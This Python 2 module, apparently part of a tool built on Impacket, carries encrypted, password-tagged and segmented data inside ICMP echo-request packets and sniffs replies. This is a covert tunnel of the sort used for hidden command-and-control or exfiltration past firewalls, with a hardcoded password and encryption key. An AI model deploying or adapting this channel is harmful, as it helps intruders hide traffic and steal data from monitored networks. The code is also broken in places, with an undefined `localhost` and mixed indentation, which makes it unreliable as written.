"""
Created by Kyle Carretto with the wonderful help of the Impacket Framwork:
                                        https://github.com/CoreSecurity/impacket/tree/master/impacket
"""
import socket
import os
import sys
import select
import time
import Queue

from impacket import ImpactDecoder
from impacket import ImpactPacket
from impacket import crypto

def getlocalip():
	return ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])

PASSWORD = "IWillGetStrippedWhenRead"
ENCRYPTION_KEY = "PleaseEncryptStuffBecauseItsNiceToDo"
CLIENT_ID = getlocalip()


def crypt(string,key):
    try:
    	return crypto.encryptSecret(key,string)
    except Exception as e:
	print e

def decrypt(string,key):
    try:
    	return crypto.decryptSecret(key,string)
    except Exception as e:
	print e


def socket_init():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.bind((localhost, 0))

    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    if os.name == 'nt':
        s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

    return s


def send_icmp(src, dst, data):
    try:
	s = socket_init()
	dataQ = Queue.Queue()
	dataQ.put("!DATAGRAM-START-SEQUENCE!")
	if data.startswith("!DATAGRAM-"):
		data += "!"

	if sys.getsizeof(PASSWORD+CLIENT_ID+"!DATAGRAM-START-SEQUENCE!"+data+"!DATAGRAM-END-SEQUENCE!") < 1000:
		dataQ.put(PASSWORD+CLIENT_ID+"!DATAGRAM-START-SEQUENCE!"+data+"!DATAGRAM-END-SEQUENCE!")
	else:
		segment = PASSWORD+CLIENT_ID+"!DATAGRAM-START-SEQUENCE!"
		
		for ch in data:
			if sys.getsizeof(PASSWORD+CLIENT_ID+segment+ch+"!DATAGRAM-END-SEQUENCE!") > 1000:
				dataQ.put(segment)
				segment = PASSWORD+CLIENT_ID
			segment += ch
		segment+="!DATAGRAM-END-SEQUENCE!"
		dataQ.put(segment)
	
	while not dataQ.empty():
		segdata = dataQ.get()

		ip = ImpactPacket.IP()
    		ip.set_ip_src(src)
    		ip.set_ip_dst(dst)
	
    		icmp = ImpactPacket.ICMP()
    		icmp.set_icmp_type(icmp.ICMP_ECHOREQUEST)

  	  	icmp.contains(ImpactPacket.Data(crypt(segdata,ENCRYPTION_KEY)))
    		ip.contains(icmp)
    		icmp.set_icmp_id(1)
    		icmp.set_icmp_cksum(0)
    		icmp.auto_checksum = 1
	
    		s.sendto(ip.get_packet(), (dst, 0))
    	s.close()
    except Exception as e:
	print "Error Encountered - Sending ICMP"
	print(e)

def sniff_icmp():
    try:
	    s = socket_init()
	    if s in select.select([ s ], [], [])[0]:
		data = s.recvfrom(65535)[0]

		decoder = ImpactDecoder.IPDecoder()
		rip = decoder.decode(data)
		ricmp = rip.child()
		encrypted_data = ricmp.get_data_as_string()
		real_data = decrypt(encrypted_data, ENCRYPTION_KEY)	
	        s.close()
		return real_data 

    except Exception as e:
	print "Error Encountered - Sniffing ICMP"
	print e
